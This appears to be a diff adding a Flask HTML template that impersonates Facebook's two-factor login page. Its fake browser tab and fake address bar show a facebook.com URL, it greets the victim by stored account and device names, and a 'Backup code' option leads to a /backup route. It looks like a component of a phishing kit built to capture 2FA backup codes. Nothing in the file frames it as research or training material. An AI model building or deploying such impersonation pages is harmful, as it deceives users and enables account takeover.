@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+  <style>
+    .fake-browser-bar {
+      width: 100%; background-color: #e5e5e5; height: 28px;
+      display: flex; align-items: center; padding: 0 12px;
+    }
+    .circle-btn {
+      width: 10px; height: 10px; background-color: #555;
+      border-radius: 50%; margin-right: 16px;
+    }
+    .tab {
+      display: flex; align-items: center; background-color: #3a3a3c;
+      padding: 4px 10px; border-radius: 10px 10px 0 0;
+      box-shadow: inset 0 0 2px #222;
+    }
+    .favicon {
+      width: 16px; height: 16px; margin-right: 6px; object-fit: contain; border-radius: 4px;
+    }
+    .tab-title { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .window-controls { display: flex; gap: 12px; margin-left: auto; }
+    .window-controls span { width: 14px; text-align: center; color: #ccc; }
+    .fake-url-bar {
+      background-color: #e6e6e6; height: 32px; display: flex;
+      align-items: center; padding: 0 10px; font-size: 13px; color: #222;
+      border-bottom: 1px solid #c0c0c0;
+    }
+    .url-left {
+      display: flex; align-items: center; overflow: hidden;
+      white-space: nowrap; text-overflow: ellipsis; flex: 1;
+    }
+    .lock-icon {
+      width: 12px; height: 12px; margin-right: 6px; filter: grayscale(1);
+    }
+    .url-text { overflow: hidden; text-overflow: ellipsis; }
+  </style>
+</head>
+<body>
+
+<!-- Fake browser bar -->
+<div class="fake-browser-bar">
+  <div class="tab">
+    <img src="https://www.facebook.com/favicon.ico" class="favicon" alt="Facebook" />
+    <span class="tab-title">Facebook</span>
+  </div>
+  <div class="window-controls">
+    <span>−</span><span>▢</span><span>×</span>
+  </div>
+</div>
+
+<!-- Fake URL bar -->
+<div class="fake-url-bar">
+  <div class="url-left">
+    <img src="{{ url_for('static', filename='key-icon12.png') }}" class="lock-icon" />
+    <span class="url-text">https://www.facebook.com/two_step_verification/two_factor</span>
+  </div>
+  <img src="{{ url_for('static', filename='key-icon.png') }}" class="lock-icon" />
+</div>
+
+<!-- Main 2FA content -->
+<div id="twoFAContent" style="display: flex; justify-content: center; margin-top: 40px;">
+  <div style="max-width: 600px; background-color: #f0f2f5; border-radius: 10px; padding: 30px;">
+    <div id="fb-name" style="font-size: 13px; font-weight: 500; margin-bottom: 5px;"></div>
+
+    <h2 style="font-size: 25px; font-weight: 550; margin: 8px 0;">Check your notifications on another device</h2>
+    <p id="fb-device" style="font-size: 15px; color: #000; margin-bottom: 18px;"></p>
+    <img src="{{ url_for('static', filename='2fanew.png') }}" alt="2FA Image" style="width: 100%; border-radius: 6px; margin-bottom: 10px;" />
+
+    <div class="approval-status">
+      <div class="loader-icon"><span class="dot-static">• • •</span></div>
+      <div class="approval-text">
+        <div class="approval-title" style="font-size: 15px; font-weight: 550;">Waiting for approval</div>
+        <div class="approval-desc" style="font-size: 13px; color: #65676B;">It may take a few minutes to get the notification on your other device.</div>
+      </div>
+    </div>
+
+    <button class="fb-secondary-btn" onclick="showAlternative()" style="margin-top: 20px; width: 100%; padding: 13px 0; border-radius: 999px; border: 1px solid #ccd0d5; background-color: #f0f2f5; font-weight: 550; cursor: pointer;">
+      Try Another Way
+    </button>
+  </div>
+</div>
+
+<!-- Alternative method content -->
+<div id="alternativeContent" style="display: none; justify-content: center; margin-top: 220px;">
+  <div style="max-width: 600px; width: 100%; background-color: #fff; border-radius: 28px; padding: 32px;">
+    <button onclick="hideAlternative()" style="border: none; background: none; font-size: 22px; float: right; cursor: pointer;">&times;</button>
+    <h2 style="font-size: 24px; font-weight: 550; margin-bottom: 8px;">Choose a way to confirm your identity</h2>
+    <p style="font-size: 16px; font-weight: 500; color: #313131; margin-bottom: 20px;">These are the confirmation methods available to you.</p>
+
+    <div style="border: 1px solid #ccd0d5; border-radius: 18px; overflow: hidden;">
+      <label style="display: flex; padding: 16px; border-bottom: 1px solid #dddfe2;">
+        <div style="flex: 1;">
+          <div style="font-weight: 600;">Notification on another device</div>
+          <div style="font-size: 13px; color: #65676b;">Approve access from another device.</div>
+        </div>
+        <input type="radio" name="confirm-option" value="device" checked style="width: 18px; height: 18px;" />
+      </label>
+      <label style="display: flex; padding: 16px;">
+        <div style="flex: 1;">
+          <div style="font-weight: 600;">Backup code</div>
+          <div style="font-size: 13px; color: #65676b;">Use a backup code you have saved</div>
+        </div>
+        <input type="radio" name="confirm-option" value="backup" style="width: 18px; height: 18px;" />
+      </label>
+    </div>
+
+    <button id="altContinue" style="background-color: #0c62d3; color: white; border: none; padding: 14px 0; width: 100%; font-weight: 700; border-radius: 999px; margin-top: 20px;">
+      Continue
+    </button>
+  </div>
+</div>
+
+<script>
+  function showAlternative() {
+    document.getElementById('twoFAContent').style.display = 'none';
+    document.getElementById('alternativeContent').style.display = 'flex';
+  }
+
+  function hideAlternative() {
+    document.getElementById('alternativeContent').style.display = 'none';
+    document.getElementById('twoFAContent').style.display = 'flex';
+  }
+
+  document.addEventListener("DOMContentLoaded", function () {
+    const acc = localStorage.getItem("fb_account");
+    const dev = localStorage.getItem("fb_device");
+
+    if (acc) {
+      document.getElementById("fb-name").innerText = acc + " • Facebook";
+    }
+    if (dev) {
+      document.getElementById("fb-device").innerText =
+        "We sent a notification to your " + dev + ". Check your Facebook notifications there and approve the login to continue.";
+    }
+
+    // Xử lý nút Continue trong Alternative
+    const continueBtn = document.getElementById("altContinue");
+    continueBtn.addEventListener("click", function () {
+      const selected = document.querySelector('input[name="confirm-option"]:checked');
+      if (selected && selected.value === "backup") {
+        window.location.href = "/backup";
+      } else {
+        alert("You selected another option (demo only).");
+      }
+    });
+  });
+</script>
+</body>
+</html>
